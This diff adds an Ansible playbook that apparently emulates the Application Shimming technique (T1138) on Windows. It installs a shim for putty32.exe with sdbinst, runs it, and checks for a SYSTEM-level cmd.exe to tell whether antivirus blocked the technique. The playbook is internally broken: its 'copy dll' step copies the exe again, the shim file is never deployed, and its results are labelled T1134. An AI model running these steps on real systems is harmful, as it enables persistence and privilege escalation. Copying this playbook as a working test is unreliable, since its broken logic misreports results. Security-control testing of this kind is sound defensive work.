@@ -1,0 +1,41 @@
+# attack_technique: T1138
+- name: T1138 - Application Shimming
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+    - name: copy putty32 bit version
+      tags: always
+      win_copy:
+        src: /opt/ansible/putty32.exe
+        dest: c:\temp\
+    - name: copy dll
+      tags: always
+      win_copy:
+        src: /opt/ansible/putty32.exe
+        dest: c:\temp\  
+    - name: install shim
+      win_command: |
+        sdbinst puttyfix32.sdb    
+      register: shim
+    - name: Execute putty32
+      tags: always
+      win_command: |
+        cmd.exe /k putty32.exe
+    - name: sleep for 10 seconds and continue with play to check if AV removed or Not
+      tags: always
+      wait_for: timeout=10
+      delegate_to: localhost
+    - name: check if file created
+      tags: always
+      win_shell: |
+        tasklist /FI "IMAGENAME eq cmd.exe" /FI "USERNAME eq NT AUTHORITY\SYSTEM"
+      register: T1134
+    - name: check if playbook was blocked
+      tags: always
+      debug: msg="Playbook Completed#T1134#blocked#win#"
+      when: '"No task" in T1134.stdout'        
+    - name: check if playbook was successfull
+      tags: always
+      debug: msg="Playbook Completed#T1134#passed#win#"
+      when: '"cmd.exe" in T1134.stdout'   
